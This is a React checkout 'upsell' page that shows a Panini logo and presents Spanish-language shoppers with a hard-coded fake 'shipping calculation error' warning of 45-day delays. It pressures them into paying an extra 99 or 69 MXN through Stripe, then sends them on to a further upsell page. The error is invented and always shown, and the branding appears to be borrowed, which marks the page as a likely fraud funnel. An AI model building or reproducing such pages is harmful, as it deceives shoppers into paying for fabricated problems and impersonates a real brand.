import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import { AlertTriangle, Lock, ChevronRight, Loader2, AlertCircle } from "lucide-react";
import { loadStripe } from "@stripe/stripe-js";
import { Elements, PaymentElement, useStripe, useElements } from "@stripe/react-stripe-js";

const stripePromise = loadStripe(import.meta.env.VITE_STRIPE_PUBLISHABLE_KEY ?? "");

const fmtMXN = (n: number) => `$${n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",")}`;

type CustomerData = {
  name: string;
  email: string;
  phone: string;
  mbwayPhone: string;
  address: string;
};

const SHIPPING_OPTIONS = [
  {
    id: "expreso",
    icon: "⚡",
    label: "Expreso",
    desc: "Entrega rápida garantizada · Llega en 1-2 días hábiles",
    price: 99,
  },
  {
    id: "estandar",
    icon: "📦",
    label: "Estándar",
    desc: "Paquetería nacional · ~3-5 días hábiles",
    price: 69,
  },
];

function StripePaymentForm({
  total,
  orderId,
  onSuccess,
  onError,
  onBack,
}: {
  total: number;
  orderId: string;
  onSuccess: () => void;
  onError: (msg: string) => void;
  onBack: () => void;
}) {
  const stripe = useStripe();
  const elements = useElements();
  const [loading, setLoading] = useState(false);

  const handlePay = async () => {
    if (!stripe || !elements) return;
    setLoading(true);
    onError("");

    const { error: submitErr } = await elements.submit();
    if (submitErr) {
      onError(submitErr.message ?? "Error en el formulario.");
      setLoading(false);
      return;
    }

    const { error } = await stripe.confirmPayment({
      elements,
      confirmParams: {
        return_url: `${window.location.origin}/upsell?return=1&orderId=${orderId}`,
      },
      redirect: "if_required",
    });

    if (error) {
      onError(error.message ?? "Pago rechazado. Inténtalo de nuevo.");
      setLoading(false);
      return;
    }

    onSuccess();
  };

  return (
    <div className="mt-4">
      <PaymentElement options={{ layout: "tabs", terms: { card: "never" } }} />
      <div className="flex gap-3 mt-4">
        <button
          type="button"
          onClick={onBack}
          className="flex-shrink-0 px-4 py-3 rounded-xl border-2 border-gray-300 text-gray-700 font-black text-sm hover:border-gray-400 transition-all"
        >
          VOLVER
        </button>
        <button
          type="button"
          onClick={handlePay}
          disabled={loading || !stripe || !elements}
          className="flex-1 bg-green-600 hover:bg-green-700 disabled:opacity-60 text-white font-black text-base py-3 rounded-xl flex items-center justify-center gap-2"
        >
          {loading
            ? <><Loader2 className="w-4 h-4 animate-spin" /> Procesando…</>
            : <>Confirmar envío — {fmtMXN(total)} <ChevronRight className="w-4 h-4" /></>
          }
        </button>
      </div>
    </div>
  );
}

export default function Upsell() {
  const [, setLocation] = useLocation();
  const [customer, setCustomer] = useState<CustomerData | null>(null);
  const [selected, setSelected] = useState<string | null>(null);
  const [clientSecret, setClientSecret] = useState<string | null>(null);
  const [orderId, setOrderId] = useState<string | null>(null);
  const [creatingIntent, setCreatingIntent] = useState(false);
  const [error, setError] = useState<string>("");
  const [done, setDone] = useState(false);

  useEffect(() => {
    try {
      const raw = sessionStorage.getItem("upsell_customer");
      if (raw) setCustomer(JSON.parse(raw) as CustomerData);
    } catch { }

    const params = new URLSearchParams(window.location.search);
    const returnOrderId = params.get("orderId");
    const redirectStatus = params.get("redirect_status");
    if (returnOrderId && redirectStatus === "succeeded") {
      setDone(true);
      setTimeout(() => setLocation("/upsell2"), 1800);
    }
  }, []);

  const selectedOption = SHIPPING_OPTIONS.find(o => o.id === selected);

  const handleCreateIntent = async () => {
    if (!selectedOption || !customer) return;
    setCreatingIntent(true);
    setError("");

    try {
      const res = await fetch("/api/payment/create-intent", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: selectedOption.price,
          customerEmail: customer.email,
          customerName: customer.name,
          customerPhone: customer.phone,
          productName: `Envío ${selectedOption.label}`,
          orderType: "upsell",
        }),
      });

      const data = await res.json() as { clientSecret?: string; orderId?: string; error?: string };

      if (!res.ok) {
        setError(data.error ?? "Error al iniciar el pago. Inténtalo de nuevo.");
        setCreatingIntent(false);
        return;
      }

      setClientSecret(data.clientSecret ?? null);
      setOrderId(data.orderId ?? null);
    } catch {
      setError("Error de conexión. Inténtalo de nuevo.");
    } finally {
      setCreatingIntent(false);
    }
  };

  if (done) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center px-4">
        <motion.div
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="bg-white rounded-2xl border border-gray-200 shadow-sm p-8 w-full max-w-sm text-center"
        >
          <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-4">
            <span className="text-3xl">✅</span>
          </div>
          <h2 className="text-xl font-black text-gray-900 mb-2">¡Envío confirmado!</h2>
          <p className="text-gray-400 text-xs animate-pulse mt-3">Redirigiendo…</p>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#fdf6f0] pb-12">
      <div className="w-full bg-[#6b0f1a] text-white py-3 px-4 flex items-center justify-center mb-6">
        <div className="bg-white rounded-md px-2 py-1">
          <img src="/assets/logo-panini-oficial.png" alt="Panini" className="h-7 w-auto object-contain" />
        </div>
      </div>

      <div className="max-w-md mx-auto px-4">

        <motion.div
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-white border-2 border-red-400 rounded-2xl p-5 mb-5 shadow-sm"
        >
          <div className="flex items-start gap-3 mb-3">
            <div className="w-9 h-9 rounded-full bg-yellow-100 flex items-center justify-center flex-shrink-0">
              <AlertTriangle className="w-5 h-5 text-yellow-600" />
            </div>
            <div>
              <h2 className="font-black text-red-700 text-base">Error en el Cálculo del Envío</h2>
              <p className="text-sm text-gray-700 mt-1 leading-relaxed">
                Detectamos un error en el cálculo del envío para la dirección{" "}
                <strong className="text-gray-900">
                  {customer?.address ?? "tu dirección"}
                </strong>
                . Este error puede causar{" "}
                <strong>retrasos de hasta 45 días</strong> en la entrega del producto.
              </p>
            </div>
          </div>
          <div className="bg-red-50 rounded-xl px-4 py-2.5 border border-red-200">
            <p className="text-sm text-red-700 font-medium">
              🎁 Por este error, enviaremos <strong>5 sobres de regalo</strong> junto con tu pedido.
            </p>
          </div>
          <div className="bg-pink-50 border border-pink-200 rounded-xl px-4 py-2.5 mt-2">
            <p className="text-sm text-pink-700 font-semibold">
              📌 Selecciona una opción de envío abajo para garantizar la entrega a tiempo.
            </p>
          </div>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ delay: 0.15 }}
          className="flex flex-col items-center mb-5"
        >
          <img
            src="/assets/pacotes-panini.png"
            alt="5 sobres de regalo"
            className="w-52 h-auto object-contain drop-shadow-md"
          />
          <p className="text-sm font-bold text-green-700 mt-2">
            ✅ +5 sobres de regalo incluidos
          </p>
          <p className="text-xs text-gray-400">Enviados gratis con tu pedido</p>
        </motion.div>

        <p className="text-xs font-black text-gray-500 uppercase tracking-widest mb-3">
          Opciones de envío disponibles
        </p>

        <div className="space-y-3 mb-6">
          {SHIPPING_OPTIONS.map((opt, i) => (
            <motion.button
              key={opt.id}
              initial={{ opacity: 0, x: -10 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 0.2 + i * 0.08 }}
              onClick={() => {
                setSelected(opt.id);
                setClientSecret(null);
                setOrderId(null);
                setError("");
              }}
              className={`w-full bg-white rounded-2xl border-2 p-4 flex items-center gap-4 text-left transition-all ${
                selected === opt.id
                  ? "border-[#6b0f1a] shadow-sm"
                  : "border-gray-200 hover:border-gray-300"
              }`}
            >
              <span className="text-2xl flex-shrink-0">{opt.icon}</span>
              <div className="flex-1 min-w-0">
                <p className="font-bold text-gray-900 text-sm">{opt.label}</p>
                <p className="text-xs text-gray-500 mt-0.5">{opt.desc}</p>
              </div>
              <div className="text-right flex-shrink-0">
                <p className="font-black text-gray-900 text-base">{fmtMXN(opt.price)}</p>
                <p className="text-xs text-[#6b0f1a] font-semibold">seleccionar →</p>
              </div>
            </motion.button>
          ))}
        </div>

        <AnimatePresence>
          {selected && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: "auto" }}
              exit={{ opacity: 0, height: 0 }}
              className="overflow-hidden"
            >
              <div className="bg-white rounded-2xl border border-gray-200 p-5 mb-4">
                <p className="text-sm font-bold text-gray-700 mb-4">Método de pago</p>

                {error && (
                  <div className="flex items-start gap-2 bg-red-50 border border-red-200 rounded-xl p-3 mb-4">
                    <AlertCircle className="w-4 h-4 text-red-500 flex-shrink-0 mt-0.5" />
                    <p className="text-xs text-red-700">{error}</p>
                  </div>
                )}

                {!clientSecret ? (
                  <button
                    onClick={handleCreateIntent}
                    disabled={creatingIntent}
                    className="w-full bg-green-600 hover:bg-green-700 disabled:opacity-60 text-white font-black text-base py-4 rounded-xl flex items-center justify-center gap-2"
                  >
                    {creatingIntent
                      ? <><Loader2 className="w-4 h-4 animate-spin" /> Preparando…</>
                      : <>Continuar con el pago <ChevronRight className="w-4 h-4" /></>
                    }
                  </button>
                ) : (
                  <Elements
                    key={clientSecret}
                    stripe={stripePromise}
                    options={{ clientSecret, locale: "es" }}
                  >
                    <StripePaymentForm
                      total={selectedOption!.price}
                      orderId={orderId!}
                      onSuccess={() => {
                        setDone(true);
                        setTimeout(() => setLocation("/upsell2"), 1800);
                      }}
                      onError={(msg) => setError(msg)}
                      onBack={() => { setClientSecret(null); setOrderId(null); }}
                    />
                  </Elements>
                )}
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        <div className="text-center mt-2">
          <button
            onClick={() => setLocation("/")}
            className="text-xs text-gray-400 hover:text-gray-600 underline"
          >
            No, gracias — continuar sin mejora de envío
          </button>
        </div>

        <p className="text-center text-xs text-gray-400 mt-6 flex items-center justify-center gap-1.5">
          <Lock className="w-3.5 h-3.5" />
          Pago 100% seguro vía Stripe
        </p>
      </div>
    </div>
  );
}
